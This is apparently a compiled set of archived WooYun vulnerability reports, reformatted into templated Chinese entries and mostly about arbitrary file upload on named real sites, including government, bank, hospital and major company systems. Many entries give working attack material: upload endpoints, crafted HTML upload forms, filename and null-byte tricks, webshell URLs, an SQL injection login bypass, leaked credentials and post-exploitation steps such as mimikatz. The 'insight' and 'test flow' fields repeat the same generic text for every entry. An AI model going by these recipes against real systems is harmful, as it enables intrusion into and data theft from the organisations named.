**POC**: #2 漏洞利用将如下代码保存为upload.htm<form enctype="multipart/form-data" method="post" action="http://www.vulns.org/sitestar/index.php?_m=mod_media&_a=flash_picker">Flash:<input type="file" name="localfile"/><input id="Upload" type="submit" value="Upload"></form>访问upload.php并上传文件,上传的时候用Burpsuite 抓包 并修改点击Forward

**绕过**: 直接利用

**修复**: 强烈建议采用统一的上传代码;对文件进行安全检查时，千万别只检查文件上传的Content-Type参数,这个参数只要抓包就可以对其进行任意修改。
---

---
### [wooyun-2013-022490] 成都人民广告电台 可上传下载  貌似可以控制播放
**厂商**: 成都人民广告电台 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先从电台一个员工登陆网站下手获取可以上传一句话的地方把一句话命名为 1.asp;jpg 即可上传了用菜刀连上后出现了 好多节目的文件如果替换了这些音频文件  你说会怎么样？！！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤！！！！
---

---
### [wooyun-2013-017350] 中国人民银行某系统文件上传漏洞
**厂商**: 中国人民银行 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 行名行号管理系统http://210.74.35.73/test.jsp自定义路径，无过滤上传。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删掉
---

---
### [wooyun-2015-0147660] 某省敏感部门某分站未授权访问信息泄露(任意文件上传\文件任意删除)
**厂商**: 某省敏感部门 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域*****.**.**&lt**********8ecc141a441aad7a5d1a.png&qu********************^ftp密码为^**********1b17d307f3c0b9ba2738.png&qu**********1c9f8dd520e04a161e8324.png*****

**POC**: mask 区域*****^^件^**********563ed460cf776de43c1f.png&qu**********385eae5c83dd24658eb5.png&qu**********712951420558a4777d60.jpg&qu**********^^部调度服务器**.**********************1500378c075879768d8b.png&qu**********，吓尿了^**********传，上面的东西也^*****

**绕过**: 直接利用

**修复**: 设置密码
---

---
### [wooyun-2013-022914] dede之京华网分站后台绕过栏目模板上传+linux提权
**厂商**: jinghua.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我直接贴图吧

**POC**: shell拿到咯,这次管理员没发现我,哈哈.下面来说提权,内核2.6.9直接上exp那个是你内网的IP吧？你上次说送我礼物怎么还没到啊,亲~~~~~~~~~~~~~~~~~~~~~~~~期待中啊。都提权了啊,终极渗透了啊,rank15不多吧.

**绕过**: 直接利用

**修复**: 。。。。。。。。。。。你还是删除那个页面吧.
---

---
### [wooyun-2013-020649] 智思留言本4.1正式版上传漏洞
**厂商**: 智思网（zhisi.net) | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 'If Action="addsave" Then KeywordsFilter(FilterKeyWord)Dim RequestU,intCount,i,formName,FileSavePath,FileSaveName,uploadsDirVarRelatePath=""FileSavePath="./ufiles/"&Year(Date())&"/"&Right("0"&Month(Date()),2)&"/"'"ufiles/2009/"'Set RequestU=new UpLoadClass'RequestU.FileType="gif/jpg/rar/zip/7z/swf/bmp/png/jpeg"'RequestU.SavePath=FileSavePath'RequestU.MaxSize=20000*1024 '20M'RequestU.Charset="UTF-8

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的..
---

---
### [wooyun-2011-01335] 腾讯动漫频道未授权上传
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址：http://mycomic.qq.com/manage/newbook.php演示：http://data1.comic.qq.com/2011-02-17/17/5075555a750f4ef2f56eac867beea498.jpg

**POC**: 上传地址：http://mycomic.qq.com/manage/newbook.php演示：http://data1.comic.qq.com/2011-02-17/17/5075555a750f4ef2f56eac867beea498.jpg

**绕过**: 直接利用

**修复**: 暂无。
---

---
### [wooyun-2015-0111406] 用友某重要系统任意文件上传漏洞之二
**厂商**: seeyon.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友GRP-U8 财务管理软件该servlet存在漏洞，可直接上传任意文件到服务器/UploadFile随便构造一个表单，上传任意文件即可<html><form method="post" action="http://210.44.112.101/UploadFile" encType="multipart/form-data"><input type="file" name="rfile_name"/><input type="submit" value="upload"/></form></html>上传后的最终路径为：https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/+上传的文件名这里为：http://210.44.112.101https://wooyun-img.oss-cn-beijing.aliyuncs.com/u

**POC**: http://210.44.112.101https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/chopper.jsp chopper

**绕过**: 直接利用

**修复**: 严格过滤
---

---
### [wooyun-2015-093827] 河北委员会战部发现上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: hbtyzx.org.cn

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 作为一个好人 我把上传的地方删了
---

---
### [wooyun-2015-0125867] 某通用型cms上传漏洞（影响多个高权重医院类型站点）
**厂商**: 54doctor | **年份**: 2015 | **类型**: 设计不当

**元思考**: 触发信号: 上传功能

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞细节：这个漏洞前两天复现的。www.54doctor.net我是医生cms通用型上传点。http://www.54doctor.net/News/Main?siteId=6 都是医院站点。上传点：ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.jst-hosp.com.cn/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.zjuch.cn/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.bjyah.com/ImageUpLoad/Index?ImageId=AvatarImageUrlhttp://www.pkuh6.cn/ImageUpLoad/Index?ImageId=AvatarImageUrl上传利用方式：服务器类型

**POC**: shell地址：http://www.jst-hosp.com.cn/Areas/News/cjk.cerhttp://www.zjuch.cn/Areas/News/234.aspxhttp://www.bjyah.com/Areas/News/234.aspxhttp://www.pkuh6.cn/Areas/News/234.aspx现在已经被删了，不知道漏洞修复没有修复，肯定还有站点没有修复吧，通知下厂商。

**绕过**: 截断攻击

**修复**: 加强文件上传验证。
---

---
### [wooyun-2013-019237] 四川省知识产权局任意上传文件获取Webshll
**厂商**: 四川省知识产权局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 四川省知识产权局任意上传文件获取Webshllhttp://www.scipo.gov.cn/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们专业
---

---
### [wooyun-2015-0131576] 东方通信某金融服务管理系统后台存在弱口令导致近百万敏感信息泄露+任意文件上传
**厂商**: 东方通信 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jrwork.eastcom.com/brm/portalbcs/framework.do?action=index&&action=login此处存在弱口令用户名:amdin密码:admin123导致上百万敏感数据泄露泄露并可以修改与各大银行之间的客户结构，4000多份销售合同，3000份服务合同，60000多份发货详情信息，1000余条开票信息，1000余条收款信息，60000多份设备方案信息+客户详情信息上万条客户投诉信息以及回访信息，50000多条设备安装信息（包括客户单位，地址），50000多条库存信息，100000余条收货详情，28万余条返货详情，近50万条短信记录信息（客户名称，单位，电话信息泄露），15万条邮件记录（客户名称，单位，联系方式），近1600条内部员工电话，姓名，OA邮箱地址，所属机构等...

**POC**: 太多了，没有一一截图后台页面登陆之后近50w邮件信息泄露，包括地址，联系人以及电话号码近30w邮包信息泄露1500名内部员工信息泄露任意文件上传

**绕过**: 直接利用

**修复**: 禁止使用弱口令~~~~
---

---
### [wooyun-2012-010593] 天空课堂文件上传漏洞
**厂商**: 南京易学信息技术有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以前自己记录留下来的，现在才翻出来，可能不详细。，打开网络课网站，如图，登陆进去，现在网盘里传一个PHP文件，网盘竟然没过滤PHP文件。，然后，进入邮件系统，，进入后选择使用网盘文件，然后选择php文件，在切换到HTML下，就可以看到这个PHP文件在服务器上路径了，http://xxx.edu.cn/SCR2006/Courseware/NetDisk/5531/111026085064.php,执行的时候好像不能写php大马，写个asp上去就可以了。这个系统数据库用户用的是sa，有点。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止网盘上传asp，php文件
---

---
### [wooyun-2014-053762] 某职业教育资源中心任意文件上传
**厂商**: 高等教育出版社 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fck导致任意文件上传

**POC**: http://www.cchve.com.cn/hep/taglib/wysiwyg/newHtmlEditor2/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://www.cchve.com.cn//hep/UserFiles/160153/File/shell.jsp

**绕过**: 直接利用

**修复**: 限制文件上传类型
---

---
### [wooyun-2013-019291] 新东方任意文件上传可致入侵
**厂商**: 新东方 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新东方任意文件上传  http://w.xdf.cn/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复图片上传禁止上传可执行文件。http://w.xdf.cn/
---

---
### [wooyun-2014-077371] 华南农业大学资源环境学院FCK上传漏洞
**厂商**: 华南农业大学 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://zyhjxy.scau.edu.cn/special/10junxun//admin/FCKeditor/editor/filemanager/connectors/test.html#

**POC**: 建立了xiao.asp的文件夹后上马上不了，蛋疼，http://zyhjxy.scau.edu.cn//uploadfile/file/2014092607423273499.txt

**绕过**: 直接利用

**修复**: 删除
---

---
### [wooyun-2015-0128549] 快递安全之百世汇通多个系统帐号体系控制不严(可获取内部敏感数据)
**厂商**: 800best.com | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、无意中找到一个未授权访问的后台.http://btr.800best.com/manage/权限还挺多的, 资料添加/新闻添加/经验分享管理/文件上传等.2、发现上传文件页面, 有个"查看文件库", 点进去后发现大量文件. 看看有没有可以利用的一些信息额, 没有什么用,再找找.得到所有网点的编号. 看看能不能利用它登录一些系统呢？3、http://btr.800best.com/i/login.asp百世快运用户名: 网点信息792个信息 + 数量为20的弱口令字典, 爆破得到以下部分信息id=4500420 pwd=666666id=2141512 pwd=888888id=3623071 pwd=123456id=5233730 pwd=123456id=3253040 pwd=123456id=3252070 pwd=1234567id=2500001 pwd=88888888i

**POC**: 已证明!PS:相关文件已经删除, 怕造成影响, 未深入.如果危害不够, 可以补充的

**绕过**: 直接利用

**修复**: 1、后台未授权访问处理一下吧;2、弱密码整改一下, 别其他的系统也受到影响;3、你们更专业.
---

---
### [wooyun-2015-0141426] 沃福建任意文件上传漏洞可导致服务器沦陷（破解Windows密码）
**厂商**: 沃福建 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 沃福建门户http://**.**.**.**/inavadmin/file/default.aspx文件管理器存在任意文件上传漏洞。存在杀软，拦一句话杀大马。通过asp马读文件发现用户ShareUser。提取aspxspy中端口映射模块反弹3389，lcx转发。ShareUser居然可以登录。。。于是mimikatz。。。

**POC**: 沃福建门户http://**.**.**.**/inavadmin/file/default.aspx 文件管理器存在任意文件上传漏洞。存在杀软，拦一句话杀大马。通过asp马读文件发现用户ShareUser。提取aspxspy中端口映射模块反弹3389，lcx转发。ShareUser居然可以登录。。。于是mimikatz。。。

**绕过**: 直接利用

**修复**: 你比我更懂
---

---
### [wooyun-2015-0152820] 某政府采购系统通用后门可秒多个政府网站
**厂商**: CERT | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.涉事情单位，政采科技，据说全国很多政府在用他家的系统，其中很多省部级单位；2.厂家本来是用来进行远程维护的，但是你直接嵌一个web后门进去，我就不认同了，下面是很熟悉的画面，这个后门相信几乎人手一个吧；后门地址：http://x.x.x.x/view/srplatform/sysconfig/browser.jsp3.好吧简单列几个单位；国信阳光招标平台；http://**.**.**.**/view/srplatform/sysconfig/browser.jsp青岛经开区采购网；**.**.**.**:88/es/view/srplatform/sysconfig/browser.jsp昆山政府采购网；http://**.**.**.**/view/srplatform/sysconfig/browser.jsp青岛黄岛新区公共交易http://**.**.**.**/view/s

**POC**: 见上

**绕过**: 直接利用

**修复**: 删除后门，使用其他的可靠的方式进行维护
---

---
### [wooyun-2013-018828] 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传
**厂商**: 三易通 | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 http://www.eeesoft.cn不多说，图片说明

**POC**: 三易通（进销存软件） SQL注射漏洞 后台管理登陆 文件上传公司网站 http://www.eeesoft.cn不多说，图片说明

**绕过**: 直接利用

**修复**: 简单吧
---

---
### [wooyun-2015-0103799] 乌鲁木齐气象网站漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台登录地址http://60.13.131.206:81/admin/index.aspadmin' or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://60.13.131.206:81/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp

**POC**: 后台登录地址http://60.13.131.206:81/admin/index.aspadmin' or 'a'='a   密码随便还存在FCK编辑器漏洞，以及一处上传漏洞上传地址：http://60.13.131.206:81/adminhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload.asp

**绕过**: 直接利用

**修复**: 。。你懂得
---

---
### [wooyun-2013-043943] 山东省人力资源和社会保障厅某系统存在任意文件上传漏洞
**厂商**: 山东省人力资源和社会保障厅 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 近期，山东省人力资源和社会保障厅委托山东省经济和信息化委员会开发山东省专业技术人员职称申报评审系统【http://sdzc.sdeic.gov.cn/eap/】由原来的c/s模式改为b/s模式了。新开的的系统就会有可能出现Bug。任意上传漏洞先注册，登陆，职称申报，基本信息，里面有一个申报人照片，经测试可以上传任何文件，没有进行过滤。里面现在有3万多条信息，这可是全省人才的信息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制文件上传类型。
---

---
### [wooyun-2012-015881] 百度网盘极速秒传设计缺陷
**厂商**: 百度 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度网盘,安装了极速秒传插件.上传网盘,提示如图信息时,这种情况下大文件传输是秒传,可以推测网盘没有上传数据,比对了MD5值之类的hash,如果MD5值一样,网盘把文件名上传体现在列表中.实际测试,准备两个不同内容但是同MD5值的文件,两个不同内容的文件上传后,下载下来发现,两个文件内容一样了.

**POC**: 安装极速秒传插件,准备两个不同内容但是同MD5值的文件,两个不同内容的文件上传后,下载下来发现,两个文件内容一样了.各位可以自测.

**绕过**: 直接利用

**修复**: 建议使用双散列比对.同时校验MD5和SHA1或其他散列算法.
---

---
### [wooyun-2014-080772] 河北汽车网存在上传漏洞
**厂商**: 河北汽车网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河北汽车网存在上传漏洞编辑器地址：http://www.hebcar.com/fckeditor/editor/filemanager/connectors/test.html

**POC**: 漏洞证明：http://www.hebcar.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/1414244374591808779.txt

**绕过**: 直接利用

**修复**: 删除吧。
---

---
### [wooyun-2015-0135496] 某市会计网络继续教育系统导致大量学员信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某市会计网络继续教育系统导致大量学员信息泄漏

**POC**: http://**.**.**.**/student_user.aspx这里的头像管理可以上传任意文件直接上马后台地址：http://**.**.**.**/manage/泄漏全市会计从业人员信息

**绕过**: 直接利用

**修复**: 你们懂得~~
---

---
### [wooyun-2012-09817] 世纪东方建站超市上传漏洞+源码泄漏
**厂商**: 成都世纪东方 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标:http://jzcs.51web.com/先注册个用户..进入互助问答http://jzcs.51web.com/maq/class/下面有上传啊 哈.直接本地构造个表单 可以使上传文件任意名(后缀必须是jpg什么的).,利用IIS6解析就行了..这是PHPWEB的一个0day啦 很多人都知道..<form name="uploadForm" method="post" enctype="multipart/form-data" action="http://jzcs.51web.com/maq/upload.php"><input type="text" name="fileName" value="hack.php;.jpg" /><input type="hidden" name="attachPath" value="news/pics/" /><input type="f

**POC**: 神马会员都有了.嘻嘻

**绕过**: 直接利用

**修复**: 1:删除根目录的网站备份文件2:PHPWEB漏洞N多 建议把站都换了.别用这程序
---

---
### [wooyun-2012-013925] 百度分站上传未过滤导致任意代码执行
**厂商**: 百度 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此页面没有过滤：http://madv.baidu.com/user/addQuali.html

**POC**: http://madv.baidu.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/quali/ce4fbd02c8d6813a9ce4cdbc.jsp[/home/work/madv-web/apache-tomcat-6.0.32/webapps/mob_ads_advhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/quali/]$ ifconfigeth1      Link encap:Ethernet  HWaddr 84:2B:2B:14:CB:9Finet

**绕过**: 直接利用

**修复**: 你们比我更专业！
---

---
### [wooyun-2014-082240] 深圳市出入境检验检疫局某处上传漏洞
**厂商**: 深圳出入境检验检疫局 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 深圳市出入境检验检疫局某处上传漏洞。是一个对FCK编辑器越权操作的上传，问题地址：http://zwdt.szciqic.net/zw/external/notice!getNoticeInfo.action?id=1718496表面看来没有问题，当在网址后面提交单引号时，出现了以下编辑器。http://zwdt.szciqic.net/zw/external/notice!getNoticeInfo.action?id=1718496'

**POC**: http://zwdt.szciqic.net/zw/userfiles/image/QQ%E5%9B%BE%E7%89%8720141106150424.jpg上传一个图片

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010169] cmseasy文件上传+IIS6解释漏洞
**厂商**: cmseasy | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件：celive\live\doajaxfileupload.php<form enctype="multipart/form-data" method="post" action="http://www.cmseasy.cn/celive/live/doajaxfileupload.php"><input type="file" name="fileToUpload"><input type="submit" value="上传"></form>http://www.cmseasy.cn/celive/uploadfiles/CELIVE-2vOWcBQMQR.php;.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂吧。。
---

---
### [wooyun-2014-051061] KnifeCMS任意文件上传漏洞
**厂商**: KnifeCMS.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: cms使用了ckeditor编辑器，好像已经二次开发。在上传的时候没有做好过滤。根据tomcat的默认配置，支持解析jspx，导致了漏洞的触发<form enctype="multipart/form-data" action="http://www.KnifeCMS.com/FileUpload" method="POST"> <input name="filedata" type="file" /><input type="submit" value="GO" /> </form>搜索关键字 inurl:type.do?tid=

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤后缀
---

---
### [wooyun-2014-082383] kppw任意文件上传-1
**厂商**: kppw | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在control/ajax/upload.php中：$pathDir = setUploadPath($fileType, $objType);$upload = new keke_upload_class(S_ROOT.$pathDir ,$fileFormat,$maxSize);$savename = $upload->run( $filename , 1);再来看run方法：function run($fileInput, $randName = 1) {if (isset ( $_FILES [$fileInput] )) {$fileArr = $_FILES [$fileInput];if (is_array ( $fileArr ['name'] )) {....}else {$this->getExt ( $fileArr ['name'] );$this->setSav

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0133662] 北京思特奇技术股份有限公司任意文件上传漏洞及旗下APP大量用户数据泄露
**厂商**: 北京思特奇技术股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传头像处可以上传图片，通过BP抓包改包，利用00截断上传JSP木马当然还有有更重要的，虽然说是上传文件和上传文件存储目录不是在同一台服务器，但是仍然可以执行脚本，并且找到了一个数据库，最后发现居然是相对应的APP的数据库登录验证

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 加强验证，删除不必要的信息
---

---
### [wooyun-2015-0143198] 河北CA某站存在任意文件上传&目录遍历&前人入侵痕迹（可替换证书）
**厂商**: 河北省电子认证有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河北省电子认证有限公司(简称河北CA),是从事信息安全服务和电子认证服务的专业机构主站：http://**.**.**.**/1#任意文件上传（fck）http://**.**.**.**/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http://**.**.**.**/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector他这个fck程序的上传不常见，有稍微修改，我试了好久才弄明白POST http://**.**.**.**/FCKeditor/uploadFile.action?type=file HTTP/1.1Accept: text/html, application/xhtml+xml, */*Refe

**POC**: 2#目录遍历http://**.**.**.**/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://**.**.**.**/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../3#前人痕迹http://

**绕过**: 截断攻击

**修复**: 正确配置fck检查站点删除木马
---

---
### [wooyun-2014-055675] 搜狗某分站任意上传文件漏洞
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://haha.sogou.com/submit上传时抓包改成php  Go

**POC**: http://haha.sogou.com/submit上传时抓包改成php  Go

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2013-022519] 风讯.net版任意代码执行(官方已经demo)
**厂商**: 风讯 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册用户，发表文章，抓包改包，打死

**POC**: 先看看上传目录有没执行权限，发现没有，看来要在包里做手脚抓包发现有路径参数，直接改包丢上去执行了打死

**绕过**: 直接利用

**修复**: 白名单吧，别禁止执行权限了，或者去掉路径参数
---

---
### [wooyun-2015-0160226] 淄博市网上公安局任意文件上传漏洞（可查看任意举报内容）
**厂商**: http://www.zbga.gov.cn/ | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/JBZX/updateFile.aspx上传地址直接截包上传http://**.**.**.**/uploads/xunwu/2015.aspx上面已经沦为乱马场了泄露oracle的数据库连接即可查询任意举报信息。。。

**POC**: http://**.**.**.**/JBZX/updateFile.aspx上传地址直接截包上传http://**.**.**.**/uploads/xunwu/2015.aspx上面已经沦为乱马场了泄露oracle的数据库连接即可查询任意举报信息。。。

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0111015] 某省旅馆业治安管理信息系统任意文件上传漏洞（可能影响全省住店记录）
**厂商**: 公安部一所 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

